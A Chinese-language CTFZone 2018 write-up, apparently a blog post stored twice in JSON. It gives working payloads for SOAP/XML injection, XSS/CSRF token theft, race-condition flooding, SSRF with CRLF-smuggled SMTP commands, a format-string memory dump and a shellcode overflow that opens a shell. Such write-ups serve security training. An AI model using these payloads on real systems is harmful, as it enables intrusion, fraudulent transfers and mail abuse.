         <receiver_wallet_num xsi:type=\"xsd:decimal\">1340</receiver_wallet_num>.\n   \t\t <sender_wallet_num xsi:type=\"xsd:decimal\">2652</sender_wallet_num>\n   \t\t <amount xsi:type=\"xsd:float\">750000</amount>\n             <token xsi:type=\"xsd:token\">somesupertokenkey1235555</token>\n           </ns1:internalTransfer>\n         </SOAP-ENV:Body>\n       </SOAP-ENV:Envelope>\n   ```\n\n## Magician\n\n1. 从support.php可知该题应该是XSS。修改*Link to Profile*可以判断后台bot使用*Firefox 61.0*\n\n   ![](/assets/ctfzone/TIM截图20180803210045.png)\n\n   vps日志显示如下:\n\n   ```\n   35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] \"GET / HTTP/1.1\" 200 65 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\"\n   35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] \"GET /favicon.ico HTTP/1.1\" 404 209 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\"\n   35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] \"GET /favicon.ico HTTP/1.1\" 404 209 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\"\n   ```\n\n2. xss漏洞\n\n   uuid存在反射型xss,限制长度36个字符\n\n   ![](/assets/ctfzone/TIM截图20180803211936.png)\n\n3. how to get flag\n\n   ![](/assets/ctfzone/TIM截图20180803212218.png)\n\n   这里需要管理员将`Status`修改为`Premium`\n\n4. 思路：\n\n   CSP如下:\n\n   ```\n   Content-Security-Policy: style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;\n   X-Frame-Options: ALLOW-FROM http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one\n   X-XSS-Protection: 1; mode=block\n   ```\n\n   由于后台使用Firefox,所以`X-XSS-Protections` 没有作用。\n\n   通过XSRF修改状态。\n\n5. 解法1：\n\n   payload如下:\n\n   ```\n   <script>\n         window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=\"><svg/onload=$.globalEval(name)', `\n           $.get(\"manage.php\", function(data){    \n                   var x = /name=\"token\" value=\"([^\"]+)/.exec(data);\n                   $.post(\"manage.php\", {user_uuid: \"86dced2a-0305-42ed-a13c-f0c2e6079805\", token: x[1], status: \"premium\"}); \n            });\n      `);\n   </script>\n   ```\n\n   含义:\n\n   ```\n   window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=\"><svg/onload=$.globalEval(name)', <long payload>) \n   ```\n\n   将 window.name 设置为`<long payload> `。\n\n   将该html放在vps上，然后提交即可。\n\n   ![](/assets/ctfzone/TIM截图20180803213031.png)\n\n   getflag\n\n   ![](/assets/ctfzone/TIM截图20180803212919.png)\n\n6. 解法2:\n\n   payload:\n\n   ```\n   http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=\"><iframe onload=srcdoc=window.name>\n   ```\n\n   `iframe`在使用参数`srcdoc`加载的时候，会被当做同一个源。\n\n   测试，在Firefox下测试\n\n   打开Firefox,在控制台中输入:\n\n   ```\n   window.name='<script>alert(\"This is XSS!\")</scrip'+'t>';\n   ```\n\n   接下来一次在控制台中输入:\n\n   ```\n   window.location = 'http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=srcdoc=window.name%3E';\n   ```\n\n   发现成功弹窗户。\n\n   ![](/assets/ctfzone/TIM截图20180803214831.png)\n\n   在次输入:\n\n   ```\n   window.location = 'http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=window.name%3E';\n   ```\n\n   我们会发现，再不添加`srcdoc`参数的情况下，不在弹窗。\n\n   ![](/assets/ctfzone/TIM截图20180803214950.png)\n\n   getflag:\n\n   ```\n   <script>\n   window.name = `\n   <script>\n   window.frameElement.onload=null;\n   console.log(window.parent.document.body.innerHTML);\n   function elo()\n   {\n   document.getElementById('cudo').onload=null;\n   r = document.getElementById('cudo').contentWindow.document;\n   r.getElementsByName('user_uuid')[0].value = 'dbb306dd-28c1-4333-88ba-9588842f08e0';\n   r.getElementsByName('status')[0].value = 'premium';\n   r.getElementById('user_manage').submit();\n   }\n   \n   `\n   window.name += '</scrip'+'t><iframe src=\"/manage.php\" onload=\"elo()\" id=\"cudo\">';\n   window.location = 'http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=srcdoc=window.name%3E'\n   ```\n\n## MMORPG 3000\n\n1. 注册登录\n\n2. 在`Donate`页面获取免费武器。\n\n   ![](/assets/ctfzone/TIM截图20180803220511.png)\n\n   图片url:\n\n   ```\n   http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_96c5c28becf18e71190460a9955aa4d8.png\n   ```\n\n   其中：\n\n   ![](/assets/ctfzone/TIM截图20180803220606.png)\n\n   此时，userid为860。\n\n3. 获取更多`coupon`\n\n   根据上边得到结果，我们可以测试一下 `859`\n\n   ![](/assets/ctfzone/TIM截图20180803221240.png)\n\n   得到url:\n\n   ```\n   http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_537de305e941fccdbba5627e3eefbb24.png\n   ```\n\n   访问该url:\n\n   ![](/assets/ctfzone/TIM截图20180803221334.png)\n\n   得到新的`Coupon`\n\n   > f598109a-942c\n\n   ![](/assets/ctfzone/TIM截图20180803221422.png)\n\n   成功长了1分。\n\n   这时候，测试`1`.\n\n   ![](/assets/ctfzone/TIM截图20180803221713.png)\n\n   得到url:\n\n   ```\n   http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_6512bd43d9caa6e02c990b0a82652dca.png\n   ```\n\n   ![](/assets/ctfzone/TIM截图20180803221807.png)\n\n   然后就可以再次得到1337分，并升级。\n\n4. 到达30级，新的问题。\n\n   ![](/assets/ctfzone/TIM截图20180803221945.png)\n\n   无法继续升级。\n\n5. 条件竞争。\n\n   这里猜测应该是条件竞争，这里猜测应该是执行数据库插入操作，高并发的情况下，导致重复插入多次。\n\n   ```\n   function levelup() {\n       balance > 10:\n       是:\n       \tlevel > 30:\n       \t是:\n       \t\texit\n       \t否:\n       \t\tlevel++                 |\n       \t\tbalance -= 10           |    在并发的情况下，没有锁的情况下，多个线程会同时进入该代码段 \n       \t\tinsert into table       | \n       否:\n       \texit\n   }\t\n   ```\n\n   并发方案1：\n\n   创建1个账号，获取足够的balance。\n\n   ```\n   import requests\n   import threading\n   \n   threadArray = []\n   \n   class expClass(threading.Thread):\n       burp0_url = \"http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one:80/donate/lvlup\"\n       burp0_cookies = {\"session\": \"eyJ1aWQiOjg2NX0.Dkaijg.3FkM2nEU3xLcIvc4DPkZxkvrjFQ\"}\n       burp0_headers = {\"User-Agent\": \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"en-GB,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/info\", \"DNT\": \"1\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\"}\n       \n       def __init__(self, numMain):\n           super(expClass, self).__init__()\n   \n       def ham(self):\n           requests.get(self.burp0_url, headers=self.burp0_headers, cookies=self.burp0_cookies)\n   \n           \n       def run(self):\n           self.ham()\n           \n   thr = 900\n   \n   for i in range(0, thr ):\n           threadcan = expClass(i)\n           threadArray.append(threadcan)\n           \n   for i in range(0, thr):\n           threadArray[i].start()\n           print \"G thread girdi => \" + str(i)\n   for i in range(0, thr):\n           threadArray[i].join()\n           print \"R thread cikti => \" + str(i)\n   ```\n\n   并发方案2：\n\n   首先创建两个新的账号，并获取足够的balance。\n\n   race_condition.py\n\n   ```\n   import threading\n   import requests\n   from Queue import Queue\n   \n   max = 100\n   threads = Queue()\n   \n   def lvlup(cookie):\n       threads.get()\n       url = \"http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/donate/lvlup\"\n       r = requests.get(url, cookies={\"session\": cookie})\n   \n   \n   def worker2(index):\n       lvlup(\"eyJ1aWQiOjg2MX0.DkX_wQ.Mvm0XsHQF4JnYmca6pt8z-vUkaE\")       # chrome\n   \n   \n   def worker(index):\n       lvlup(\"eyJ1aWQiOjg2Mn0.DkX_zA.egXto8_Qdii7FNhj43zKekmtYP0\")         # firefox\n   \n   \n   def race():\n       for i in range(max):\n           thread = threading.Thread(target=worker, args=[i])\n           thread.start()\n       for i in range(max):\n           thread = threading.Thread(target=worker2, args=[i])\n           thread.start()\n       for i in range(max * 2):\n           threads.put(i)\n       threads.join()\n   \n   \n   race()\n   ```\n\n   结果：\n\n   ![](/assets/ctfzone/TIM截图20180803232555.png)\n\n6. SSRF\n\n   通过条件竞争，到达31级别，出现了新的页面。\n\n   ```\n   http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar\n   ```\n\n   这里存在ssrf漏洞。\n\n   ![](/assets/ctfzone/TIM截图20180803234111.png)\n\n   通过测试，可以发现过滤了`127.0.0.1`, `localhost`,可以通过`0.0.0.0`或者`127.0.0.2` bypass。\n\n   端口扫描:\n\n   示意图如下：\n\n   ![](/assets/ctfzone/TIM截图20180803234335.png)\n\n   \n\n   经过测试，发现25端口开放。\n\n   ![](/assets/ctfzone/port_scan.png)\n\n   这里存在http header注入(CRLF注入)\n\n   构造paylaod:\n\n   ```\n   Host: [0.0.0.0\n   helo 1v3m\n   mail from:<qaewjlfnwej@o3enzyme.com>\n   rcpt to:<root>\n   data\n   subject: give me flag\n   \n   1v3m\n   .\n   ]:25\n   ```\n\n   最终payload:\n\n   ```\n   [0.0.0.0%0ahelo 1v3m%0amail from:<qaewjlfnwej@o3enzyme.com>%0arcpt to:<root>%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25\n   ```\n\n7. solution1:\n\n   最终请求包:\n\n   ```\n   POST /user/avatar HTTP/1.1\n   Host: web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one\n   User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\n   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n   Accept-Language: en-GB,en;q=0.5\n   Accept-Encoding: gzip, deflate\n   Referer: http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar\n   Content-Type: multipart/form-data; boundary=---------------------------4693211868403427471435307016\n   Content-Length: 581\n   Cookie: session=eyJ1aWQiOjgyN30.DjaSgA.ylhJXkstamQ7GahYWvUypKpvDQc\n   DNT: 1\n   Connection: close\n   Upgrade-Insecure-Requests: 1\n   \n   -----------------------------4693211868403427471435307016\n   Content-Disposition: form-data; name=\"avatar\"; filename=\"\"\n   Content-Type: application/octet-stream\n   \n   \n   -----------------------------4693211868403427471435307016\n   Content-Disposition: form-data; name=\"url\"\n   \n   https://[0.0.0.0%0ahelo 1v3m%0amail from:<qaewjlfnwej@o3enzyme.com>%0arcpt to:<root>%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25\n   -----------------------------4693211868403427471435307016\n   Content-Disposition: form-data; name=\"action\"\n   \n   save\n   -----------------------------4693211868403427471435307016--\n   ```\n\n8. solution2\n\n   参考网址：https://github.com/p4-team/ctf/tree/master/2018-07-21-ctfzone-quals/web_mmorpg\n\n   ```\n   HELO 127.0.0.1\n   MAIL FROM:<A@B.c>\n   RCPT TO:<1096026150@qq.com>\n   DATA\n   From: AAA@B.C\n   To: 1096026150@qq.com\n   Subject: give me flag\n   .\n   QUIT\n   ```\n\n   payload1:\n\n   ```\n   curl 'web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar' -H 'Cookie: session=eyJ1aWQiOjg2NX0.Dkan9A.U5_9q25Izo0Y4yJq__o2oAdRAc0' --data 'url=https://127.0.0.2%0d%0aHELO 127.0.0.2%0aMAIL FROM: <A@B.C>%0aRCPT TO: <1096026150@qq.com>%0aDATA%0aFROM: AAA@B.C%0aTO: 1096026150@qq.com%0aSUBJECT: GIB%0d%0a.%0d%0a%0aQUIT%0a:25&action=save'\n   ```\n\n   注意，`url`需要使用`https`,ip地址除了`127.0.0.2`,也可以使用`0.0.0.0`。\n\n   ```\n   #define DEF_SMTPD_FORBID_CMDS    \"CONNECT GET POST\"\n   \n           /* Ignore smtpd_forbid_cmds lookup errors. Non-critical feature. */\n           if (cmdp->name == 0) {\n           state->where = SMTPD_CMD_UNKNOWN;\n           if (is_header(argv[0].strval)\n               || (*var_smtpd_forbid_cmds\n            && string_list_match(smtpd_forbid_cmds, argv[0].strval))) {\n                   msg_warn(\"non-SMTP command from %s: %.100s\",\n                        state->namaddr, vstring_str(state->buffer));\n                   smtpd_chat_reply(state, \"221 2.7.0 Error: I can break rules, too. Goodbye.\");\n                   break;\n               }\n           }\n   ```\n\n   原因:\n\n   ```\n   Our mistake was missing the special case implemented in postfix:\n   There is a hardening which targets exactly what we wanted to do - using HTTP request with injected headers to smuggle SMTP commands. The way to bypass this was to use https instead of http, because in such case the initial part of the request will actually be encrypted, and SMTP will ignore it, and the Host will be in plaintext so the server will receive nice set of SMTP commands. \n   简单来说，就是当我们使用http请求，并使用 http header注入 来注入SMTP命令的时候，会被拦截。可以使用 https， 因为 https 流量是加密过的，这样，SMTP会忽略该流量，当流量到达主机，会被解密，这时候SMTP就会收到一组漂亮的 SMTP 命令。\n   ```\n\n   结果:\n\n   ![](/assets/ctfzone/TIM截图20180803235132.png)\n\n# PWN\n\n## easypwn_strings\n\ndump.py:\n\n```\nfrom pwn import *\n\ndef conn():\n    return remote('pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one', 1234)\n\ndef dump(adr,frmt='p'):\n    r.recvuntil('StrRemoveLastSymbols')\n    r.recvuntil('\\n')\n    r.sendline('3')\n    r.recvuntil(':')\n    r.recvuntil('\\n')\n\n    leak_part = \"|%19${}|\".format(frmt)\n    out = leak_part.ljust(4*10,\"A\")+\"EOF_\"+p32(adr)\n    r.sendline(out)\n    r.sendline('0')\n    r.recvuntil('Result:')\n    return r.recvuntil(\"|A\")[:-2].split(\"|\")[1]\n\nstart_addr = 0x8048750\n\nwhile True:\n    try:\n        fd = open(\"dumped_file\",\"a\")\n        r = conn()\n        data = dump(start_addr,'s')\n        print \"|0x%08x|%s|\" % (start_addr,data)\n        if data == \"(null)\" or data == \"\":\n            fd.write(\"\\x00\")\n            start_addr += 1\n        else:\n            fd.write(data+\"\\x00\")\n            start_addr += len(data)+1\n        fd.close()\n        r.close()\n    except Exception as e:\n        print e\n        print \"[!] execption\"\n        break\n```\n\npayload.py:\n\n```\n#!/usr/bin/env python2\nfrom pwn import *\ndef recvlines(lnum):\n    global p\n    res=\"\"\n    for x in range(lnum):\n        res+=p.recvline()\n    return res\n \nhost=\"pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one\"\nport=1234\n \nbase_buf=0x80492e0\nshellcode=\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"\npayload=(\"y\"+shellcode).ljust(256,\"\\x90\")+p32(base_buf+1)\np=remote(host,port)\n#p=process(\"./babypwn\")\nprint recvlines(4)\np.sendline(\"X\")\nprint recvlines(3)\np.sendline(payload)\np.interactive()\n```\n\n","source":"_posts/ctfzone-ctf.md","raw":"---\ntitle: ctfzone-ctf\ndate: 2018-08-03 10:11:42\ntags: ctf\n---\n\n# Web\n\n## Piggy Bank\n\n1. 根据注释找到*http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php*\n\n   ```xml\n   <wsdl:definitions xmlns:tns=\"urn:Bank\" xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:wsdl=\"http://schemas.xmlsoap.org/wsdl/\" xmlns=\"http://schemas.xmlsoap.org/wsdl/\" name=\"Bank\" targetNamespace=\"urn:Bank\">\n   <message name=\"BalanceRequest\">\n   <part name=\"wallet_num\" type=\"xsd:decimal\"/>\n   </message>\n   <message name=\"BalanceResponse\">\n   <part name=\"code\" type=\"xsd:float\"/>\n   <part name=\"status\" type=\"xsd:string\"/>\n   </message>\n   <message name=\"internalTransferRequest\">\n   <part name=\"receiver_wallet_num\" type=\"xsd:decimal\"/>\n   <part name=\"sender_wallet_num\" type=\"xsd:decimal\"/>\n   <part name=\"amount\" type=\"xsd:float\"/>\n   <part name=\"token\" type=\"xsd:string\"/>\n   </message>\n   <message name=\"internalTransferResponse\">\n   <part name=\"code\" type=\"xsd:float\"/>\n   <part name=\"status\" type=\"xsd:string\"/>\n   </message>\n   <portType name=\"BankServicePort\">\n   <operation name=\"requestBalance\">\n   <input message=\"tns:BalanceRequest\"/>\n   <output message=\"tns:BalanceResponse\"/>\n   </operation>\n   <operation name=\"internalTransfer\">\n   <input message=\"tns:internalTransferRequest\"/>\n   <output message=\"tns:internalTransferResponse\"/>\n   </operation>\n   </portType>\n   <binding name=\"BankServiceBinding\" type=\"tns:BankServicePort\">\n   <soap:binding style=\"rpc\" transport=\"http://schemas.xmlsoap.org/soap/http\"/>\n   <operation name=\"requestBalance\">\n   <soap:operation soapAction=\"urn:requestBalanceAction\"/>\n   <input>\n   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n   </input>\n   <output>\n   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n   </output>\n   </operation>\n   <operation name=\"internalTransfer\">\n   <soap:operation soapAction=\"urn:internalTransferAction\"/>\n   <input>\n   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n   </input>\n   <output>\n   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n   </output>\n   </operation>\n   </binding>\n   <wsdl:service name=\"BankService\">\n   <wsdl:port name=\"BankServicePort\" binding=\"tns:BankServiceBinding\">\n   <soap:address location=\"http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php\"/>\n   </wsdl:port>\n   </wsdl:service>\n   </wsdl:definitions>\n   ```\n\n2. 包含两个API\n\n   - **Request Balance** allows us to see the balance of any account id we want.\n   - **Internal Transfer** transfers some amount from account *sender* to account *receiver*.\n\n3. 解法1：XML/soap注入\n\n   internalTransfer请求：\n\n   ```xml\n   <receiver_wallet_num xsi:type=\"xsd:decimal\"> [DATA FROM FORM INPUT] </receiver_wallet_num>\n   <sender_wallet_num xsi:type=\"xsd:decimal\"> [LOGGED IN USER ID] </sender_wallet_num>\n   <amount xsi:type=\"xsd:float\"> [DATA FROM FORM INPUT] </amount>\n   <token xsi:type=\"xsd:string\"> [SECRET SERVER TOKEN] </token>\n   ```\n\n   传递参数Receiver:\n\n   ```\n   (Our ID) </receiver_wallet_num>\n   <sender_wallet_num xsi:type=\"xsd:decimal\">(Any ID)</sender_wallet_num><!--\n   ```\n\n   传递参数Amount:\n\n   ```\n   --><amount xsi:type=\"xsd:float\"> (Amount)\n   ```\n\n   结果:\n\n   ```xml\n   <receiver_wallet_num xsi:type=\"xsd:decimal\"> (Our ID) </receiver_wallet_num>\n   <sender_wallet_num xsi:type=\"xsd:decimal\">(Any ID)</sender_wallet_num>\n   <!-- </receiver_wallet_num>\n   <sender_wallet_num xsi:type=\"xsd:decimal\"> [LOGGED IN USER ID] </sender_wallet_num>\n   <amount xsi:type=\"xsd:float\"> \n   -->\n   <amount xsi:type=\"xsd:float\"> (Amount) </amount>\n   <token xsi:type=\"xsd:string\"> [SECRET SERVER TOKEN] </token>\n   ```\n\n   然后开burp跑就行。\n\n   ![](/assets/ctfzone/TIM截图20180803174532.png)\n\n4. 解法2：Host header poisoning\n\n   从上图，我们可以看到当前Host是`web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one`\n\n   修改该Host为我们的vps_ip,并在我们的vps上创建`/api/bankservice.wsdl.php`文件，然后发包，监听80端口。\n\n   ![](/assets/ctfzone/TIM截图20180803181237.png)\n\n   监听端口:\n\n   >ngrep -q -d eth0 -W byline port 80\n\n   抓包结果：\n\n   ```\n   T 10.135.89.224:80 -> 18.184.147.62:46038 [A]\n   HTTP/1.1 200 OK.\n   Date: Fri, 03 Aug 2018 10:08:43 GMT.\n   Server: Apache/2.4.6 (CentOS) PHP/5.4.16.\n   X-Powered-By: PHP/5.4.16.\n   Content-Length: 2907.\n   Connection: close.\n   Content-Type: text/html; charset=UTF-8.\n   .\n   <?xml version=\"1.0\" encoding=\"utf-8\"?><wsdl:definitions name=\"Bank\"\n                targetNamespace=\"urn:Bank\"\n                xmlns:tns=\"urn:Bank\"\n                xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\"\n                xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n                xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\"\n                xmlns:wsdl=\"http://schemas.xmlsoap.org/wsdl/\"\n                xmlns=\"http://schemas.xmlsoap.org/wsdl/\">\n   \n       <message name=\"BalanceRequest\">\n           <part name=\"wallet_num\" type=\"xsd:decimal\"/>\n       </message>\n   \n       <message name=\"BalanceResponse\">\n           <part name=\"code\" type=\"xsd:float\"/>\n           <part name=\"status\" type=\"xsd:string\"/>\n       </message>\n   \n       <message name=\"internalTransferRequest\">\n           <part name=\"receiver_wallet_num\" type=\"xsd:decimal\"/>\n           <part name=\"sender_wallet_num\" type=\"xsd:decimal\"/>\n           <part name=\"amount\" type=\"xsd:float\"/>\n           <part name=\"token\" type=\"xsd:string\"/>\n       </message>\n   \n       <message name=\"internalTransferResponse\">\n           <part name=\"code\" type=\"xsd:float\"/>\n           <part name=\"status\" type=\"xsd:string\"/>\n       </message>\n   \n       <portType name=\"BankServicePort\">\n           <operation name=\"requestBalance\">\n               <input message=\"tns:BalanceRequest\"/>\n               <output message=\"tns:BalanceResponse\"/>\n           </operation>\n           <operation name=\"internalTransfer\">\n               <input message=\"tns:internalTransferRequest\"/>\n               <output message=\"tns:internalTransferResponse\"/>\n           </operation>\n       </portType>\n   \n       <binding name=\"BankServiceBinding\" type=\"tns:BankServicePort\">\n           <soap:binding style=\"rpc\" transport=\"http://schemas.xmlsoap.org/soap/http\"/>\n           <operation name=\"requestBalance\">\n               <soap:operation soapAction=\"urn:requestBalanceAction\"/>\n               <input>\n                   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n               </input>\n               <output>\n                   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n               </output>\n           </operation>\n           <operation name=\"internalTransfer\">\n               <soap:operation soapAction=\"urn:internalTransferAction\"/>\n               <input>\n                   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n               </input>\n               <output>\n                   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n               </output>\n           </operation>\n       </b\n   \n   T 10.135.89.224:80 -> 18.184.147.62:46038 [AP]\n   inding>\n   \n       <wsdl:service name=\"BankService\">\n           <wsdl:port name=\"BankServicePort\" binding=\"tns:BankServiceBinding\">\n               <soap:address location=\"http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php\" />\n           </wsdl:port>\n       </wsdl:service>\n   </wsdl:definitions>\n   \n   T 18.184.147.62:46040 -> 10.135.89.224:80 [AP]\n   POST /api/bankservice.php HTTP/1.1.\n   Host: 123.207.90.143.\n   Connection: Keep-Alive.\n   User-Agent: PHP-SOAP/7.0.30-0ubuntu0.16.04.1.\n   Content-Type: application/soap+xml; charset=utf-8; action=\"internalTransferAction\".\n   Content-Length: 869.\n   .\n   <SOAP-ENV:Envelope SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"urn:Bank\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n         <SOAP-ENV:Body>\n           <ns1:internalTransfer>\n             <receiver_wallet_num xsi:type=\"xsd:decimal\">1340</receiver_wallet_num>.\n   <sender_wallet_num xsi:type=\"xsd:decimal\">.2652.</sender_wallet_num><!--</receiver_wallet_num>\n             <sender_wallet_num xsi:type=\"xsd:decimal\">1340</sender_wallet_num>\n             <amount xsi:type=\"xsd:float\">--><amount xsi:type=\"xsd:float\">750000</amount>\n             <token xsi:type=\"xsd:token\">somesupertokenkey1235555</token>\n           </ns1:internalTransfer>\n         </SOAP-ENV:Body>\n       </SOAP-ENV:Envelope>\n      \n   T 10.135.89.224:80 -> 18.184.147.62:46040 [AP]\n   HTTP/1.1 404 Not Found.\n   Date: Fri, 03 Aug 2018 10:08:43 GMT.\n   Server: Apache/2.4.6 (CentOS) PHP/5.4.16.\n   Content-Length: 217.\n   Keep-Alive: timeout=5, max=100.\n   Connection: Keep-Alive.\n   Content-Type: text/html; charset=iso-8859-1.\n   .\n   <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n   <html><head>\n   <title>404 Not Found</title>\n   </head><body>\n   <h1>Not Found</h1>\n   <p>The requested URL /api/bankservice.php was not found on this server.</p>\n   </body></html>\n   ```\n\n   这样我们就拿到了token，然后就可以愉快的转账了。\n\n   直接按这个发这个包即可:\n\n   ```\n   T 18.184.147.62:46040 -> 10.135.89.224:80 [AP]\n   POST /api/bankservice.php HTTP/1.1.\n   Host: 123.207.90.143.\n   Connection: Keep-Alive.\n   User-Agent: PHP-SOAP/7.0.30-0ubuntu0.16.04.1.\n   Content-Type: application/soap+xml; charset=utf-8; action=\"internalTransferAction\".\n   Content-Length: 869.\n   .\n   <SOAP-ENV:Envelope SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"urn:Bank\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n         <SOAP-ENV:Body>\n           <ns1:internalTransfer>\n             <receiver_wallet_num xsi:type=\"xsd:decimal\">1340</receiver_wallet_num>.\n   \t\t <sender_wallet_num xsi:type=\"xsd:decimal\">2652</sender_wallet_num>\n   \t\t <amount xsi:type=\"xsd:float\">750000</amount>\n             <token xsi:type=\"xsd:token\">somesupertokenkey1235555</token>\n           </ns1:internalTransfer>\n         </SOAP-ENV:Body>\n       </SOAP-ENV:Envelope>\n   ```\n\n## Magician\n\n1. 从support.php可知该题应该是XSS。修改*Link to Profile*可以判断后台bot使用*Firefox 61.0*\n\n   ![](/assets/ctfzone/TIM截图20180803210045.png)\n\n   vps日志显示如下:\n\n   ```\n   35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] \"GET / HTTP/1.1\" 200 65 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\"\n   35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] \"GET /favicon.ico HTTP/1.1\" 404 209 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\"\n   35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] \"GET /favicon.ico HTTP/1.1\" 404 209 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\"\n   ```\n\n2. xss漏洞\n\n   uuid存在反射型xss,限制长度36个字符\n\n   ![](/assets/ctfzone/TIM截图20180803211936.png)\n\n3. how to get flag\n\n   ![](/assets/ctfzone/TIM截图20180803212218.png)\n\n   这里需要管理员将`Status`修改为`Premium`\n\n4. 思路：\n\n   CSP如下:\n\n   ```\n   Content-Security-Policy: style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;\n   X-Frame-Options: ALLOW-FROM http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one\n   X-XSS-Protection: 1; mode=block\n   ```\n\n   由于后台使用Firefox,所以`X-XSS-Protections` 没有作用。\n\n   通过XSRF修改状态。\n\n5. 解法1：\n\n   payload如下:\n\n   ```\n   <script>\n         window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=\"><svg/onload=$.globalEval(name)', `\n           $.get(\"manage.php\", function(data){    \n                   var x = /name=\"token\" value=\"([^\"]+)/.exec(data);\n                   